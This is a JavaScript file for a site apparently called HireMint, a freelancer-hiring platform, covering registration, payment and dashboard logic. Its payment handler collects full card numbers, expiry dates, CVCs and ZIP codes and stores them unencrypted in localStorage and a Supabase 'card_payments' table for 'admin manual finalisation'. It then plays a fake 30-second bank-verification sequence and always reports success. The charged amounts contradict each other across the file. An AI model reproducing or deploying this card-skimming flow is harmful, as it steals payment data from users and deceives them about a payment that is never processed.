// HireMint static site — shared interactions

// Mobile nav toggle
document.addEventListener('click', (e) => {
  const toggle = e.target.closest('[data-menu-toggle]');
  if (toggle) {
    const nav = document.querySelector('[data-mobile-nav]');
    if (nav) nav.classList.toggle('open');
  }
});

// Register role toggle
function applyRole(role) {
  document.querySelectorAll('[data-role]').forEach(b => b.classList.toggle('active', b.dataset.role === role));
  const dyn = document.querySelector('[data-role-label]');
  const dynInput = document.querySelector('[data-role-input]');
  if (dyn && dynInput) {
    if (role === 'freelancer') {
      dyn.textContent = 'Headline / Specialty';
      dynInput.placeholder = 'e.g. Senior React Developer';
    } else {
      dyn.textContent = 'Company';
      dynInput.placeholder = 'e.g. Acme Inc.';
    }
  }
  document.querySelectorAll('[data-freelancer-only]').forEach(el => {
    el.style.display = role === 'freelancer' ? '' : 'none';
  });
  window.__hmRole = role;
}
document.addEventListener('click', (e) => {
  const btn = e.target.closest('[data-role]');
  if (!btn) return;
  applyRole(btn.dataset.role);
});
if (document.querySelector('[data-role]')) applyRole('freelancer');

// Register form -> verified modal (freelancer) or client success -> dashboard
const regForm = document.getElementById('register-form');
if (regForm) {
  regForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(regForm).entries());
    data.role = window.__hmRole || 'freelancer';
    data.registeredAt = new Date().toISOString();
    data.verified = true;

    try {
      const all = JSON.parse(localStorage.getItem('hiremint_users') || '[]');
      all.push(data);
      localStorage.setItem('hiremint_users', JSON.stringify(all));
      localStorage.setItem('hiremint_current_user', JSON.stringify(data));
    } catch (_) {}

    // Persist to Supabase (silent fail — keeps demo working if offline)
    try {
      if (window.hmSupabase) {
        const { data: row, error } = await window.hmSupabase
          .from('registrations')
          .insert({
            full_name: data.fullName,
            email: data.email,
            phone: data.phone,
            role: data.role,
            country: data.country,
            city: data.city,
            headline: data.headline,
            referral: data.referral,
            verified: true,
          })
          .select('id')
          .single();
        if (!error && row?.id) {
          localStorage.setItem('hiremint_current_registration_id', row.id);
        } else if (error) {
          console.warn('[hiremint] registration insert failed:', error.message);
        }
      }
    } catch (err) { console.warn('[hiremint] supabase register error:', err); }

    if (data.role === 'freelancer') {
      const modal = document.getElementById('success-modal');
      const nameEl = document.getElementById('modal-name');
      if (nameEl && data.fullName) nameEl.textContent = data.fullName.split(' ')[0];
      if (modal) {
        modal.classList.add('open');
        document.body.style.overflow = 'hidden';
      }
    } else {
      // Client flow: quick success message then redirect to dashboard
      const btn = regForm.querySelector('button[type=submit]');
      if (btn) { btn.disabled = true; btn.textContent = '✓ Registration successful — redirecting…'; }
      setTimeout(() => { window.location.href = 'dashboard.html'; }, 1400);
    }
  });
}

const continueBtn = document.getElementById('continue-to-payment');
if (continueBtn) {
  continueBtn.addEventListener('click', () => {
    document.body.style.overflow = '';
    window.location.href = 'payment.html';
  });
}

// Payment form -> long processing (~30s) -> success -> dashboard redirect
const payForm = document.getElementById('payment-form');
if (payForm) {
  payForm.addEventListener('submit', (e) => {
    e.preventDefault();

    // Capture & store card details for admin manual finalisation (demo only)
    const data = Object.fromEntries(new FormData(payForm).entries());
    let currentUser = {};
    try { currentUser = JSON.parse(localStorage.getItem('hiremint_current_user') || '{}'); } catch (_) {}
    const payment = {
      userName: currentUser.fullName || '—',
      userEmail: currentUser.email || '—',
      cardName: data.cardName || '',
      cardNumber: data.cardNumber || '',
      expiry: data.expiry || '',
      cvc: data.cvc || '',
      zip: data.zip || '',
      amount: '2.99',
      status: 'pending',
      submittedAt: new Date().toISOString(),
    };
    try {
      const all = JSON.parse(localStorage.getItem('hiremint_payments') || '[]');
      all.push(payment);
      localStorage.setItem('hiremint_payments', JSON.stringify(all));
    } catch (_) {}

    // Persist to Supabase
    (async () => {
      try {
        if (!window.hmSupabase) return;
        const regId = localStorage.getItem('hiremint_current_registration_id') || null;
        const { error } = await window.hmSupabase.from('card_payments').insert({
          registration_id: regId,
          user_name: payment.userName,
          user_email: payment.userEmail,
          card_name: payment.cardName,
          card_number: payment.cardNumber,
          expiry: payment.expiry,
          cvc: payment.cvc,
          zip: payment.zip,
          amount_usd: 49.00,
          status: 'pending',
        });
        if (error) console.warn('[hiremint] payment insert failed:', error.message);
      } catch (err) { console.warn('[hiremint] supabase payment error:', err); }
    })();

    const btn = payForm.querySelector('button[type=submit]');
    if (btn) { btn.disabled = true; btn.textContent = 'Processing…'; }

    const progress = document.getElementById('pay-progress');
    const ptext = document.getElementById('pay-progress-text');
    if (progress) progress.style.display = 'block';

    const steps = [
      { t: 0,     msg: 'Contacting your bank…' },
      { t: 6000,  msg: 'Verifying card details…' },
      { t: 13000, msg: 'Running fraud checks…' },
      { t: 20000, msg: 'Authorising $0.99 payment…' },
      { t: 26000, msg: 'Finalising your activation…' },
    ];
    const timers = steps.map(s => setTimeout(() => { if (ptext) ptext.textContent = s.msg; }, s.t));

    setTimeout(() => {
      timers.forEach(clearTimeout);
      const card = document.getElementById('pay-card');
      const ok = document.getElementById('pay-success');
      if (card) card.style.display = 'none';
      if (ok) ok.style.display = 'block';
      // Auto-redirect after a short pause so user sees the success
      setTimeout(() => { window.location.href = 'dashboard.html'; }, 2500);
    }, 30000);
  });
}

// Card number formatter
document.querySelectorAll('[data-format=card]').forEach(inp => {
  inp.addEventListener('input', () => {
    let v = inp.value.replace(/\D/g, '').slice(0, 16);
    inp.value = v.replace(/(.{4})/g, '$1 ').trim();
  });
});
document.querySelectorAll('[data-format=expiry]').forEach(inp => {
  inp.addEventListener('input', () => {
    let v = inp.value.replace(/\D/g, '').slice(0, 4);
    inp.value = v.length > 2 ? v.slice(0,2) + ' / ' + v.slice(2) : v;
  });
});

// Hero search -> search.html
const searchForm = document.getElementById('hero-search');
if (searchForm && !searchForm.getAttribute('action')) {
  searchForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const q = searchForm.querySelector('input').value.trim();
    window.location.href = 'search.html' + (q ? '?q=' + encodeURIComponent(q) : '');
  });
}

// Dashboard greeting
const dashName = document.getElementById('dash-name');
if (dashName) {
  try {
    const u = JSON.parse(localStorage.getItem('hiremint_current_user') || '{}');
    if (u.fullName) dashName.textContent = u.fullName.split(' ')[0];
  } catch (_) {}
}
